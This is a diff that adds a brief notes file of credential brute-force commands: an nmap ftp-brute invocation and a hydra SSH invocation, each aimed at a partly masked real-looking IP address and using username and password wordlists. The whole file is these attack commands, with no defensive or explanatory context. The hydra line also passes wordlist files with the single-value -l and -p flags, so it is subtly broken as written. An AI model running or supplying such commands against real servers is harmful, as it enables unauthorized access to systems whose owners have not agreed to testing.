@@ -1,0 +1,5 @@
+ftp:
+nmap --script ftp-brute --script-args brute.emptypass=true,ftp-brute.timeout=30,userdb=/root/dirtionary/usernames.txt,brute.useraspass=true,passdb=/root/dirtionary/passwords.txt,brute.threads=3,brute.delay=6 203.195.xx.xx
+
+ssh：
+hydra -l /root/dictionary/ssh/ssh-user.txt -p /root/dictionary/ssh/ssh-pwd-100.txt -v -s 2222（port） -t 10（threads） ssh://185.5.xx.xx
